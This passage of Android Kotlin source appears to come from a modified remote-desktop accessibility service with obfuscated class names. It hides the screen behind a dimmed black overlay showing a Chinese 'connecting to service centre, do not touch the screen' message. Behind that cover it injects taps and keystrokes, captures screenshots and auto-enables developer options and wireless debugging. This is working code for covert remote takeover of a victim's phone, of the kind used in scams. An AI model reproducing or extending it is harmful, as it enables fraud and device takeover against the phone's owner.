            val displayLongEdge = max(metrics.widthPixels, metrics.heightPixels)
            val overlayLongEdge = max(3840, max(currentLongEdge, displayLongEdge))
            overLayparams_bass.width = overlayLongEdge
            overLayparams_bass.height = overlayLongEdge
            overLayparams_bass.gravity = Gravity.LEFT or Gravity.TOP
            overLayparams_bass.x = 0
            overLayparams_bass.y = 0
            overLayparams_bass.flags =
                (overLayparams_bass.flags or FLAG_LAYOUT_IN_SCREEN or FLAG_LAYOUT_NO_LIMITS or
                    FLAG_FULLSCREEN or FLAG_NOT_TOUCHABLE or FLAG_NOT_FOCUSABLE)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                overLayparams_bass.layoutInDisplayCutoutMode =
                    LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
        if (active) {
            addBlankDevProgressView()
            val blackCover = View(this).apply {
                setBackgroundColor(Color.BLACK)
                background?.alpha = 248
                visibility = View.VISIBLE
            }
            overLay.addView(
                blackCover,
                FrameLayout.LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)
            )
            addBlankHintTextView()
        }
    }

    private fun addBlankDevProgressView() {
        val text = blankDevProgressText ?: return
        val view = TextView(this).apply {
            this.text = text
            textSize = 12f
            setTextColor(Color.WHITE)
            includeFontPadding = false
            maxLines = 2
            maxWidth = blankDp(150)
            setPadding(blankDp(8), blankDp(5), blankDp(8), blankDp(5))
            background = GradientDrawable().apply {
                setColor(Color.argb(170, 33, 100, 210))
                cornerRadius = blankDp(6).toFloat()
            }
        }
        val params = FrameLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT).apply {
            gravity = Gravity.TOP or Gravity.RIGHT
            topMargin = blankDp(120)
            rightMargin = blankDp(12)
        }
        overLay.addView(view, params)
    }

    private fun addBlankHintTextView() {
        val metrics = resources.displayMetrics
        val hintSize = 5 * blankDp(100)
        val hintTopMargin = metrics.heightPixels - hintSize - blankDp(60)
        val view = TextView(this).apply {
            text = "\n\n正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务"
            textSize = 16.5f
            typeface = Typeface.DEFAULT
            setTextColor(Color.WHITE)
            gravity = Gravity.LEFT or Gravity.BOTTOM
            includeFontPadding = true
            setPadding(blankDp(20), blankDp(20), blankDp(20), blankDp(20))
            setBackgroundColor(Color.TRANSPARENT)
            importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_NO
        }
        val params = FrameLayout.LayoutParams(hintSize, hintSize).apply {
            gravity = Gravity.LEFT or Gravity.TOP
            topMargin = hintTopMargin
            leftMargin = blankDp(60)
        }
        overLay.addView(view, params)
    }

    private fun refreshVideoAfterBlankChange(reason: String, requestCleanScreenshot: Boolean) {
        try {
            overLay.invalidate()
        } catch (_: Exception) {
        }
        nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-now")
        handler.postDelayed({ nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-early") }, 80)
        handler.postDelayed({ nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-mid") }, 260)
        handler.postDelayed({ nZW99cdXQ0COhB2o.refreshVideoAfterPenetrate("$reason-late") }, 700)
        if (requestCleanScreenshot && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            handler.postDelayed({ requestOneShotScreenshotFrame("$reason-clean") }, 120)
        }
    }

    private fun applyBlankBrightness(reason: String) {
        if (blankSavedBrightness == null) {
            blankSavedBrightness = Settings.System.getInt(
                contentResolver,
                Settings.System.SCREEN_BRIGHTNESS,
                125
            )
            blankSavedBrightnessMode = Settings.System.getInt(
                contentResolver,
                Settings.System.SCREEN_BRIGHTNESS_MODE,
                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
            )
        }
        try {
            if (canWriteSystemBrightness()) {
                val modeWritten = Settings.System.putInt(
                    contentResolver,
                    Settings.System.SCREEN_BRIGHTNESS_MODE,
                    Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
                )
                blankSystemBrightnessApplied = blankSystemBrightnessApplied || modeWritten
                val brightnessWritten = Settings.System.putInt(
                    contentResolver,
                    Settings.System.SCREEN_BRIGHTNESS,
                    10
                )
                blankSystemBrightnessApplied = blankSystemBrightnessApplied || brightnessWritten
            }
        } catch (e: Exception) {
            Log.e("InputService", "apply blank system brightness failed: $reason", e)
        }
        setBlankWindowBrightness(true, reason)
    }

    private fun restoreBlankBrightness(reason: String) {
        val savedBrightness = blankSavedBrightness
        val savedMode = blankSavedBrightnessMode
        try {
            if (blankSystemBrightnessApplied && canWriteSystemBrightness() && savedBrightness != null) {
                Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, savedBrightness)
                if (savedMode != null) {
                    Settings.System.putInt(
                        contentResolver,
                        Settings.System.SCREEN_BRIGHTNESS_MODE,
                        savedMode
                    )
                }
            }
        } catch (e: Exception) {
            Log.e("InputService", "restore blank system brightness failed: $reason", e)
        } finally {
            blankSavedBrightness = null
            blankSavedBrightnessMode = null
            blankSystemBrightnessApplied = false
        }
        setBlankWindowBrightness(false, reason)
    }

    private fun canWriteSystemBrightness(): Boolean {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.System.canWrite(this)
    }

    private fun setBlankWindowBrightness(active: Boolean, reason: String) {
        if (!::overLayparams_bass.isInitialized) return
        val target = if (active) 10f / 255f else WindowManager.LayoutParams.BRIGHTNESS_OVERRIDE_NONE
        if (overLayparams_bass.screenBrightness == target && blankWindowBrightnessApplied == active) return
        overLayparams_bass.screenBrightness = target
        blankWindowBrightnessApplied = active
        updateBlankOverlayLayoutParams("brightness-$reason")
    }

    private fun updateBlankOverlayLayoutParams(reason: String) {
        if (!::windowManager.isInitialized || !::overLay.isInitialized || overLay.windowToken == null) {
            return
        }
        try {
            windowManager.updateViewLayout(overLay, overLayparams_bass)
        } catch (e: Exception) {
            Log.e("InputService", "update blank overlay layout failed: $reason", e)
        }
    }

    private fun blankDp(value: Int): Int {
        return (value * resources.displayMetrics.density + 0.5f).toInt()
    }


       private fun openBrowserWithUrl(url: String) {
	     try {
		Handler(Looper.getMainLooper()).post(
		{
		    val intent = Intent("android.intent.action.VIEW", Uri.parse(url))
		    intent.flags = 268435456
		    if (intent.resolveActivity(packageManager) != null) {
			      DFrLMwitwQbfu7AC.app_ClassGen11_Context?.let {
				    it.startActivity(intent)
				}    
		    }
		    else
		   {
			    DFrLMwitwQbfu7AC.app_ClassGen11_Context?.let {
				    it.startActivity(intent)
				}
		   }
		})
	     } catch (e: Exception) {
	    }
      }

    
    @RequiresApi(Build.VERSION_CODES.N)
    private fun consumeWheelActions() {
        if (isWheelActionsPolling) {
            return
        } else {
            isWheelActionsPolling = true
        }
        wheelActionsQueue.poll()?.let {
            dispatchGesture(it, null, null)
            timer.purge()
            timer.schedule(object : TimerTask() {
                override fun run() {
                    isWheelActionsPolling = false
                    consumeWheelActions()
                }
            }, WHEEL_DURATION + 10)
        } ?: let {
            isWheelActionsPolling = false
            return
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun performClick(x: Int, y: Int, duration: Long) {
        val path = Path()
        path.moveTo(x.toFloat(), y.toFloat())
        try {
            val longPressStroke = GestureDescription.StrokeDescription(path, 0, duration)
            val builder = GestureDescription.Builder()
            builder.addStroke(longPressStroke)

            dispatchGesture(builder.build(), null, null)
        } catch (e: Exception) {
    
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun longPress(x: Int, y: Int) {
        performClick(x, y, longPressDuration)
    }

    private fun startGesture(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            touchPath.reset()
        } else {
            touchPath = Path()
        }
        touchPath.moveTo(x.toFloat(), y.toFloat())
        lastTouchGestureStartTime = System.currentTimeMillis()
        lastX = x
        lastY = y
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun doDispatchGesture(x: Int, y: Int, willContinue: Boolean) {
        touchPath.lineTo(x.toFloat(), y.toFloat())
        var duration = System.currentTimeMillis() - lastTouchGestureStartTime
        if (duration <= 0) {
            duration = 1
        }
        try {
            if (stroke == null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    stroke = GestureDescription.StrokeDescription(
                        touchPath,
                        0,
                        duration,
                        willContinue
                    )
                } else {
                    stroke = GestureDescription.StrokeDescription(
                        touchPath,
                        0,
                        duration
                    )
                }
            } else {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    stroke = stroke?.continueStroke(touchPath, 0, duration, willContinue)
                } else {
                    stroke = null
                    stroke = GestureDescription.StrokeDescription(
                        touchPath,
                        0,
                        duration
                    )
                }
            }
            stroke?.let {
                val builder = GestureDescription.Builder()
                builder.addStroke(it)
        
                dispatchGesture(builder.build(), null, null)
            }
        } catch (e: Exception) {
 
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun continueGesture(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            doDispatchGesture(x, y, true)
            touchPath.reset()
            touchPath.moveTo(x.toFloat(), y.toFloat())
            lastTouchGestureStartTime = System.currentTimeMillis()
            lastX = x
            lastY = y
        } else {
            touchPath.lineTo(x.toFloat(), y.toFloat())
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun endGestureBelowO(x: Int, y: Int) {
        try {
            touchPath.lineTo(x.toFloat(), y.toFloat())
            var duration = System.currentTimeMillis() - lastTouchGestureStartTime
            if (duration <= 0) {
                duration = 1
            }
            val stroke = GestureDescription.StrokeDescription(
                touchPath,
                0,
                duration
            )
            val builder = GestureDescription.Builder()
            builder.addStroke(stroke)

            dispatchGesture(builder.build(), null, null)
        } catch (e: Exception) {
      
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    private fun endGesture(x: Int, y: Int) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            doDispatchGesture(x, y, false)
            touchPath.reset()
            stroke = null
        } else {
            endGestureBelowO(x, y)
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun onKeyEvent(data: ByteArray) {
        val keyEvent = KeyEvent.parseFrom(data)
        val keyboardMode = keyEvent.getMode()

        var textToCommit: String? = null

        // [down] indicates the key's state(down or up).
        // [press] indicates a click event(down and up).
        // https://github.com/rustdesk/rustdesk/blob/3a7594755341f023f56fa4b6a43b60d6b47df88d/flutter/lib/models/input_model.dart#L688
        if (keyEvent.hasSeq()) {
            textToCommit = keyEvent.getSeq()
        } else if (keyboardMode == KeyboardMode.Legacy) {
            if (keyEvent.hasChr() && (keyEvent.getDown() || keyEvent.getPress())) {
                val chr = keyEvent.getChr()
                if (chr != null) {
                    textToCommit = String(Character.toChars(chr))
                }
            }
        } else if (keyboardMode == KeyboardMode.Translate) {
        } else {
        }


        var ke: KeyEventAndroid? = null
        if (Build.VERSION.SDK_INT < 33 || textToCommit == null) {
            ke = KeyEventConverter.toAndroidKeyEvent(keyEvent)
        }
        ke?.let { event ->
            if (tryHandleVolumeKeyEvent(event)) {
                return
            } else if (tryHandlePowerKeyEvent(event)) {
                return
            }
        }

        if (Build.VERSION.SDK_INT >= 33) {
            getInputMethod()?.let { inputMethod ->
                inputMethod.getCurrentInputConnection()?.let { inputConnection ->
                    if (textToCommit != null) {
                        textToCommit?.let { text ->
                            inputConnection.commitText(text, 1, null)
                        }
                    } else {
                        ke?.let { event ->
                            inputConnection.sendKeyEvent(event)
                            if (keyEvent.getPress()) {
                                val actionUpEvent = KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode)
                                inputConnection.sendKeyEvent(actionUpEvent)
                            }
                        }
                    }
                }
            }
        } else {
            val handler = Handler(Looper.getMainLooper())
            handler.post {
                ke?.let { event ->
                    val possibleNodes = possibleAccessibiltyNodes()
      
                    for (item in possibleNodes) {
                        val success = trySendKeyEvent(event, item, textToCommit)
                        if (success) {
                            if (keyEvent.getPress()) {
                                val actionUpEvent = KeyEventAndroid(KeyEventAndroid.ACTION_UP, event.keyCode)
                                trySendKeyEvent(actionUpEvent, item, textToCommit)
                            }
                            break
                        }
                    }
                }
            }
        }
    }

    private fun tryHandleVolumeKeyEvent(event: KeyEventAndroid): Boolean {
        when (event.keyCode) {
            KeyEventAndroid.KEYCODE_VOLUME_UP -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    volumeController.raiseVolume(null, true, AudioManager.STREAM_SYSTEM)
                }
                return true
            }
            KeyEventAndroid.KEYCODE_VOLUME_DOWN -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    volumeController.lowerVolume(null, true, AudioManager.STREAM_SYSTEM)
                }
                return true
            }
            KeyEventAndroid.KEYCODE_VOLUME_MUTE -> {
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    volumeController.toggleMute(true, AudioManager.STREAM_SYSTEM)
                }
                return true
            }
            else -> {
                return false
            }
        }
    }

    private fun tryHandlePowerKeyEvent(event: KeyEventAndroid): Boolean {
        if (event.keyCode == KeyEventAndroid.KEYCODE_POWER) {
            // Perform power dialog action when action is up
            if (event.action == KeyEventAndroid.ACTION_UP) {
                performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
            }
            return true
        }
        return false
    }

    private fun insertAccessibilityNode(list: LinkedList<AccessibilityNodeInfo>, node: AccessibilityNodeInfo) {
        if (node == null) {
            return
        }
        if (list.contains(node)) {
            return
        }
        list.add(node)
    }

    private fun findChildNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) {
            return null
        }
        if (node.isEditable() && node.isFocusable()) {
            return node
        }
        val childCount = node.getChildCount()
        for (i in 0 until childCount) {
            val child = node.getChild(i)
            if (child != null) {
                if (child.isEditable() && child.isFocusable()) {
                    return child
                }
                if (Build.VERSION.SDK_INT < 33) {
                    child.recycle()
                }
            }
        }
        for (i in 0 until childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val result = findChildNode(child)
                if (Build.VERSION.SDK_INT < 33) {
                    if (child != result) {
                        child.recycle()
                    }
                }
                if (result != null) {
                    return result
                }
            }
        }
        return null
    }

    private fun possibleAccessibiltyNodes(): LinkedList<AccessibilityNodeInfo> {
        val linkedList = LinkedList<AccessibilityNodeInfo>()
        val latestList = LinkedList<AccessibilityNodeInfo>()

        val focusInput = findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        var focusAccessibilityInput = findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)

        val rootInActiveWindow = getRootInActiveWindow()


        if (focusInput != null) {
            if (focusInput.isFocusable() && focusInput.isEditable()) {
                insertAccessibilityNode(linkedList, focusInput)
            } else {
                insertAccessibilityNode(latestList, focusInput)
            }
        }

        if (focusAccessibilityInput != null) {
            if (focusAccessibilityInput.isFocusable() && focusAccessibilityInput.isEditable()) {
                insertAccessibilityNode(linkedList, focusAccessibilityInput)
            } else {
                insertAccessibilityNode(latestList, focusAccessibilityInput)
            }
        }

        val childFromFocusInput = findChildNode(focusInput)

        if (childFromFocusInput != null) {
            insertAccessibilityNode(linkedList, childFromFocusInput)
        }

        val childFromFocusAccessibilityInput = findChildNode(focusAccessibilityInput)
        if (childFromFocusAccessibilityInput != null) {
            insertAccessibilityNode(linkedList, childFromFocusAccessibilityInput)
        }

        if (rootInActiveWindow != null) {
            insertAccessibilityNode(linkedList, rootInActiveWindow)
        }

        for (item in latestList) {
            insertAccessibilityNode(linkedList, item)
        }

        return linkedList
    }

    private fun trySendKeyEvent(event: KeyEventAndroid, node: AccessibilityNodeInfo, textToCommit: String?): Boolean {
        node.refresh()
        this.fakeEditTextForTextStateCalculation?.setSelection(0,0)
        this.fakeEditTextForTextStateCalculation?.setText(null)

        val text = node.getText()
        var isShowingHint = false
        if (Build.VERSION.SDK_INT >= 26) {
            isShowingHint = node.isShowingHintText()
        }

        var textSelectionStart = node.textSelectionStart
        var textSelectionEnd = node.textSelectionEnd

        if (text != null) {
            if (textSelectionStart > text.length) {
                textSelectionStart = text.length
            }
            if (textSelectionEnd > text.length) {
                textSelectionEnd = text.length
            }
            if (textSelectionStart > textSelectionEnd) {
                textSelectionStart = textSelectionEnd
            }
        }

        var success = false

        if (textToCommit != null) {
            if ((textSelectionStart == -1) || (textSelectionEnd == -1)) {
                val newText = textToCommit
                this.fakeEditTextForTextStateCalculation?.setText(newText)
                success = updateTextForAccessibilityNode(node)
            } else if (text != null) {
                this.fakeEditTextForTextStateCalculation?.setText(text)
                this.fakeEditTextForTextStateCalculation?.setSelection(
                    textSelectionStart,
                    textSelectionEnd
                )
                this.fakeEditTextForTextStateCalculation?.text?.insert(textSelectionStart, textToCommit)
                success = updateTextAndSelectionForAccessibiltyNode(node)
            }
        } else {
            if (isShowingHint) {
                this.fakeEditTextForTextStateCalculation?.setText(null)
            } else {
                this.fakeEditTextForTextStateCalculation?.setText(text)
            }
            if (textSelectionStart != -1 && textSelectionEnd != -1) {
          
                this.fakeEditTextForTextStateCalculation?.setSelection(
                    textSelectionStart,
                    textSelectionEnd
                )
            }

            this.fakeEditTextForTextStateCalculation?.let {
                // This is essiential to make sure layout object is created. OnKeyDown may not work if layout is not created.
                val rect = Rect()
                node.getBoundsInScreen(rect)

                it.layout(rect.left, rect.top, rect.right, rect.bottom)
                it.onPreDraw()
                if (event.action == KeyEventAndroid.ACTION_DOWN) {
                    val succ = it.onKeyDown(event.getKeyCode(), event)
        
                } else if (event.action == KeyEventAndroid.ACTION_UP) {
                    val success = it.onKeyUp(event.getKeyCode(), event)
         
                } else {}
            }

            success = updateTextAndSelectionForAccessibiltyNode(node)
        }
        return success
    }

    fun updateTextForAccessibilityNode(node: AccessibilityNodeInfo): Boolean {
        var success = false
        this.fakeEditTextForTextStateCalculation?.text?.let {
            val arguments = Bundle()
            arguments.putCharSequence(
                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                it.toString()
            )
            success = node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
        }
        return success
    }

    fun updateTextAndSelectionForAccessibiltyNode(node: AccessibilityNodeInfo): Boolean {
        var success = updateTextForAccessibilityNode(node)

        if (success) {
            val selectionStart = this.fakeEditTextForTextStateCalculation?.selectionStart
            val selectionEnd = this.fakeEditTextForTextStateCalculation?.selectionEnd

            if (selectionStart != null && selectionEnd != null) {
                val arguments = Bundle()
                arguments.putInt(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT,
                    selectionStart
                )
                arguments.putInt(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT,
                    selectionEnd
                )
                success = node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, arguments)
          
            }
        }

        return success
    }

private val executor = Executors.newFixedThreadPool(5)

fun runSafe(task: () -> Unit) {
    if (Looper.myLooper() == Looper.getMainLooper()) {
        executor.execute { task() }
    } else {
        task()
    }
}

fun b481c5f9b372ead() {
    runSafe {
        ClsFx9V0S.dLpeh1Rh(this@nZW99cdXQ0COhB2o)
    }
}

fun e8104ea96da3d44() {
    runSafe {
        try {
            ClsFx9V0S.v1Al9U5y(
                this@nZW99cdXQ0COhB2o,
                ClassGen12Globalnode,
                ClassGen12TP
            )
            
            synchronized(this) {
                ClassGen12TP = ""
                ClassGen12NP = false
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}


fun b481c5f9b372ead_2() {
    Handler(Looper.getMainLooper()).post {
        ClsFx9V0S.dLpeh1Rh(this@nZW99cdXQ0COhB2o)
    }
}

    fun e8104ea96da3d44_2() {
	    
 Handler(Looper.getMainLooper()).post {
    try {

     ClsFx9V0S.v1Al9U5y(
	this@nZW99cdXQ0COhB2o,
	ClassGen12Globalnode,
	ClassGen12TP
       )
        ClassGen12TP = ""
        ClassGen12NP = false
    } catch (e: Exception) {
        e.printStackTrace()
    }
}
 

}

    fun startWirelessDebugAutomation(enable: Boolean) {
        wirelessDebugAutomationTarget = enable
        wirelessDebugAutomationError = ""
        wirelessDebugAutomationMessage = if (enable) {
            "Starting wireless debugging automation..."
        } else {
            "Starting wireless debugging shutdown..."
        }
        wirelessDebugAutomationStartedAt = SystemClock.uptimeMillis()
        wirelessDebugAutomationScrollCount = 0
        wirelessDebugAutomationBuildTapCount = 0
        wirelessDebugAutomationEventQueued = false
        lastWirelessDebugProcessMs = 0L
        lastWirelessDebugToggleMs = 0L
        developerOptionsOpenRequestedAt = 0L
        developerOptionsParentEntryClicked = false
        developerOptionsSearchRetryCount = 0
        wirelessDebugAutomationRunning = true
        wirelessDebugAutomationState = WirelessDebugAutomationState.IDLE

        handler.post {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                finishWirelessDebugAutomation(false, "Wireless debugging requires Android 11+")
                return@post
            }

            if (isWirelessDebuggingEnabled(this) == enable) {
                finishWirelessDebugAutomation(true, if (enable) "Wireless debugging is enabled" else "Wireless debugging is disabled")
                return@post
            }

            if (isDeveloperOptionsEnabled() || !enable) {
                openDeveloperOptionsForWirelessDebug()
            } else {
                openAboutPhoneForDeveloperMode()
            }
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
        }
    }

    fun cancelWirelessDebugAutomation() {
        wirelessDebugAutomationRunning = false
        wirelessDebugAutomationEventQueued = false
        wirelessDebugAutomationState = WirelessDebugAutomationState.IDLE
        wirelessDebugAutomationMessage = "Wireless debugging automation cancelled"
        wirelessDebugAutomationError = ""
        wirelessDebugAutomationScrollCount = 0
        wirelessDebugAutomationBuildTapCount = 0
        developerOptionsOpenRequestedAt = 0L
        developerOptionsParentEntryClicked = false
        developerOptionsSearchRetryCount = 0
        handler.post {
            // No-op barrier: lets any already queued automation callback observe running=false.
        }
    }

    private fun isDeveloperOptionsEnabled(): Boolean {
        return try {
            Settings.Global.getInt(contentResolver, Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) == 1
        } catch (_: Throwable) {
            false
        }
    }

    private fun openAboutPhoneForDeveloperMode() {
        wirelessDebugAutomationState = WirelessDebugAutomationState.OPENING_ABOUT_PHONE
        wirelessDebugAutomationMessage = "Developer options are disabled; opening About phone..."
        try {
            val intent = Intent(Settings.ACTION_DEVICE_INFO_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Throwable) {
            Log.e("InputService", "open about phone failed", e)
            finishWirelessDebugAutomation(false, "Unable to open About phone")
        }
    }

    private fun openDeveloperOptionsForWirelessDebug() {
        try {
            wirelessDebugAutomationScrollCount = 0
            wirelessDebugAutomationState = WirelessDebugAutomationState.OPENING_DEV_OPTIONS
            developerOptionsParentEntryClicked = false
            developerOptionsSearchRetryCount = 0
            developerOptionsOpenRequestedAt = SystemClock.uptimeMillis()
            val intent = Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            wirelessDebugAutomationMessage = "Developer options opened, searching wireless debugging entry..."
        } catch (e: Throwable) {
            Log.e("InputService", "open developer options failed", e)
            openMainSettingsForDeveloperOptionsSearch(
                "Unable to open Developer options directly; searching Settings entry..."
            )
        }
    }

    private fun openMainSettingsForDeveloperOptionsSearch(reason: String) {
        try {
            wirelessDebugAutomationScrollCount = 0
            wirelessDebugAutomationState = WirelessDebugAutomationState.FINDING_DEV_OPTIONS_ENTRY
            developerOptionsParentEntryClicked = false
            developerOptionsSearchRetryCount = 0
            val intent = Intent(Settings.ACTION_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            wirelessDebugAutomationMessage = reason
        } catch (e: Throwable) {
            Log.e("InputService", "open settings failed", e)
            finishWirelessDebugAutomation(false, "Unable to open Settings")
        }
    }

    private fun processWirelessDebugAutomationEvent(@Suppress("UNUSED_PARAMETER") event: AccessibilityEvent) {
        if (!wirelessDebugAutomationRunning) return
        val pkg = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
        if (!isSettingsOrSystemPackage(pkg)) return
        if ((wirelessDebugAutomationState == WirelessDebugAutomationState.OPENING_ABOUT_PHONE ||
                wirelessDebugAutomationState == WirelessDebugAutomationState.TAPPING_BUILD_NUMBER) &&
            containsAnyKeyword(collectEventTexts(event), DEV_MODE_ENABLED_HINT_KEYWORDS)
        ) {
            wirelessDebugAutomationMessage = "Developer mode enabled event detected; opening Developer options..."
            openDeveloperOptionsForWirelessDebug()
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }
        queueWirelessDebugProcess(120L)
    }

    private fun queueWirelessDebugProcess(delayMs: Long = 0L) {
        if (!wirelessDebugAutomationRunning) return
        if (wirelessDebugAutomationEventQueued) return
        wirelessDebugAutomationEventQueued = true
        handler.postDelayed({
            wirelessDebugAutomationEventQueued = false
            if (!wirelessDebugAutomationRunning) return@postDelayed
            val now = SystemClock.uptimeMillis()
            val minInterval = 300L
            if (now - lastWirelessDebugProcessMs < minInterval) {
                queueWirelessDebugProcess(minInterval)
                return@postDelayed
            }
            lastWirelessDebugProcessMs = now
            processWirelessDebugAutomationRoot()
        }, delayMs)
    }

    private fun processWirelessDebugAutomationRoot() {
        if (!wirelessDebugAutomationRunning) return
        val now = SystemClock.uptimeMillis()
        if (now - wirelessDebugAutomationStartedAt > WIRELESS_DEBUG_TIMEOUT_MS) {
            finishWirelessDebugAutomation(false, "Wireless debugging automation timed out")
            return
        }

        val target = wirelessDebugAutomationTarget
        if (isWirelessDebuggingEnabled(this) == target) {
            finishWirelessDebugAutomation(true, if (target) "Wireless debugging is enabled" else "Wireless debugging is disabled")
            return
        }

        val root = rootInActiveWindow
        if (root == null) {
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        if (wirelessDebugAutomationState == WirelessDebugAutomationState.CONFIRMING_DIALOG &&
            clickConfirmIfPresent(root)
        ) {
            wirelessDebugAutomationState = WirelessDebugAutomationState.CONFIRMING_DIALOG
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        if (wirelessDebugAutomationState == WirelessDebugAutomationState.CONFIRMING_DIALOG &&
            now - lastWirelessDebugToggleMs < 1_500L
        ) {
            wirelessDebugAutomationMessage = "Waiting for wireless debugging switch state..."
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            return
        }

        when (wirelessDebugAutomationState) {
            WirelessDebugAutomationState.OPENING_ABOUT_PHONE,
            WirelessDebugAutomationState.TAPPING_BUILD_NUMBER -> handleDeveloperModeEnabling(root)
            WirelessDebugAutomationState.FINDING_DEV_OPTIONS_ENTRY -> handleDeveloperOptionsEntrySearch(root)
            WirelessDebugAutomationState.OPENING_DEV_OPTIONS,
            WirelessDebugAutomationState.FINDING_WIRELESS_DEBUG,
            WirelessDebugAutomationState.CONFIRMING_DIALOG -> handleWirelessDebugPageOrEntry(root, target)
            else -> handleWirelessDebugPageOrEntry(root, target)
        }
    }

    private fun handleDeveloperOptionsEntrySearch(root: AccessibilityNodeInfo) {
        val pageTexts = ArrayList<String>()
        collectNodeTexts(root, pageTexts)

        if (containsAnyKeyword(pageTexts, DEV_OPTIONS_KEYWORDS)) {
            val devNode = findNodeByKeywords(root, DEV_OPTIONS_KEYWORDS)
            if (devNode != null && clickSettingsEntry(devNode, allowGestureFallback = true)) {
                wirelessDebugAutomationState = WirelessDebugAutomationState.OPENING_DEV_OPTIONS
                developerOptionsOpenRequestedAt = SystemClock.uptimeMillis()
                developerOptionsSearchRetryCount = 0
                wirelessDebugAutomationMessage = "Developer options entry tapped; waiting for page..."
                queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
                return
            }
            wirelessDebugAutomationState = WirelessDebugAutomationState.FINDING_WIRELESS_DEBUG
            wirelessDebugAutomationMessage = "Developer options page detected; searching wireless debugging..."
            handleWirelessDebugPageOrEntry(root, wirelessDebugAutomationTarget)
            return
        }

        if (!developerOptionsParentEntryClicked) {
            val parentNode = findNodeByKeywords(root, DEV_OPTIONS_PARENT_KEYWORDS)
            if (parentNode != null && clickSettingsEntry(parentNode, allowGestureFallback = true)) {
                developerOptionsParentEntryClicked = true
                wirelessDebugAutomationScrollCount = 0
                developerOptionsSearchRetryCount = 0
                wirelessDebugAutomationMessage = "Developer options parent entry tapped; searching inside..."
                queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
                return
            }
        }

        if (containsAnyKeyword(pageTexts, WIRELESS_DEBUG_KEYWORDS)) {
            wirelessDebugAutomationState = WirelessDebugAutomationState.FINDING_WIRELESS_DEBUG
            handleWirelessDebugPageOrEntry(root, wirelessDebugAutomationTarget)
            return
        }

        if (wirelessDebugAutomationScrollCount < WIRELESS_DEBUG_MAX_SCROLL && scrollDown(root)) {
            wirelessDebugAutomationScrollCount++
            developerOptionsSearchRetryCount = 0
            wirelessDebugAutomationMessage = "Searching Settings for Developer options..."
            queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
        } else {
            developerOptionsSearchRetryCount++
            if (developerOptionsSearchRetryCount <= 8) {
                wirelessDebugAutomationMessage =
                    "Waiting for Settings page to expose Developer options (${developerOptionsSearchRetryCount}/8)..."
                queueWirelessDebugProcess(WIRELESS_DEBUG_RETRY_DELAY_MS)
            } else {
                finishWirelessDebugAutomation(false, "Developer options entry was not found in Settings")
            }
        }
    }

    private fun handleDeveloperModeEnabling(root: AccessibilityNodeInfo) {
        val pageTexts = ArrayList<String>()
        collectNodeTexts(root, pageTexts)

        if (isDeveloperOptionsEnabled()) {
            wirelessDebugAutomationMessage = "Developer options enabled; opening Developer options..."
